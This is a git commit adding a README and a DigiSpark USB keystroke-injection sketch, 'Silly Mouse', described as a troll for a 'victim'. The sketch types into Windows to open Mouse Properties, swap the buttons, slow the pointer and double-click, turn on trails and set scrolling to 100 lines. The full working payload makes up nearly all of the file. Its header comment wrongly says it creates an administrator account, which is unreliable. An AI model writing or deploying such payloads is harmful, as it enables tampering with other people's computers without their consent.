5a370e4ad870a3fc5f8e73d4f2869c0c0fbc13bb
Tudor Velican <tudorvelican@gmail.com>
2019-10-24 22:37:50 +0200

    Added Silly_Mouse script

---
+++ Silly_Mouse/README.md
@@ -0,0 +1,14 @@
+# Silly Mouse script
+Why? Because why not? This is the ultimate troll that messes with your victim's mouse settings to unbearable levels.
+Inspired by Caleb Hutchinson's Silly Mouse Ducky Payload from hak5darren/USB-Rubber-Ducky, ported to Windows 10 and made better.
+
+# This script does the following:
+1. Opens Mouse Properties
+2. Switches primary and secondary buttons
+3. Changes double-click speed to slow
+4. Displays pointer trails
+5. Decreases pointer speed to lowest possible setting
+6. Increases Vertical Scroll increment to 100 lines
+
+# Credits
+- Vel1khaN
---
+++ Silly_Mouse/Silly_Mouse.ino
@@ -0,0 +1,89 @@
+//This DigiSpark script creates new local user and adds it to "Administrators" group
+//Tested on Windows 10 with English(US) keyboard layout
+//Created by Michyus
+#include "DigiKeyboard.h"
+void setup() {
+  #define KEY_TAB 43
+  #define KEY_ARROW_RIGHT 0x4F
+}
+
+void loop() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("main.cpl");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_SPACE);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_TAB);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_TAB, MOD_SHIFT_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_TAB, MOD_SHIFT_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_RIGHT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_RIGHT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_TAB);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_TAB);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_TAB);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_TAB);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_SPACE);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_TAB, MOD_SHIFT_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_TAB, MOD_SHIFT_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_TAB, MOD_SHIFT_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_TAB, MOD_SHIFT_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_RIGHT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_TAB);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_SPACE);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_TAB);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("100");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  for(;;){ /*empty*/ }
+}
